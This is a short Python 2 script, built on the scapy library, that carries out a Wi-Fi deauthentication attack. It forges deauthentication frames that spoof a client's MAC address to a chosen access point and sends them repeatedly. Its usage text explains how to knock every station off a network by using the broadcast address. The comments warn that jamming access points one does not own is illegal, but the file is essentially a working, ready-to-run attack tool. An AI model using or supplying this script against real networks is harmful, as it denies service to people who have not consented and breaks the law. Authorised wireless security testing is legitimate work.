#!/usr/bin/python2
## You have to have scapy.
## Put your interface into monitor mode first.
## Jamming AP's you do not own is illegal in most countries.

## Basic Dot.11 deauthentication is made easy using scapy library.
## How does it work?
## - The vulnerability lies in the protocol - if anyone spoofs your MAC and tells the AP that you just disconnected, it will disconnect you.

## https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack

import sys, os

if os.geteuid() != 0:
  print('Run it as a privileged user.\n')
  sys.exit(1)

def help():
 print('./scapy-deauth.py interface bssid client count'\
 '\nExample - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50'\
 '\nTo deauth all the stations, set client argument mac to FF:FF:FF:FF:FF:FF\n')

if len(sys.argv) != 5:
  help()
  sys.exit(1)

from scapy.all import *
__IN = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

def main():
  def deauth():
    sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=__IN[2],addr2=__IN[1],addr3=__IN[2])/Dot11Deauth(reason=7))
    print("[*] " + str(n+1) + ' Deauth sent via: ' + __IN[0] + ' to BSSID: ' + __IN[1] + ' spoofing Client: ' + __IN[2])
  for n in range(int(__IN[3])):
    deauth()

if __name__ == "__main__":
  main()

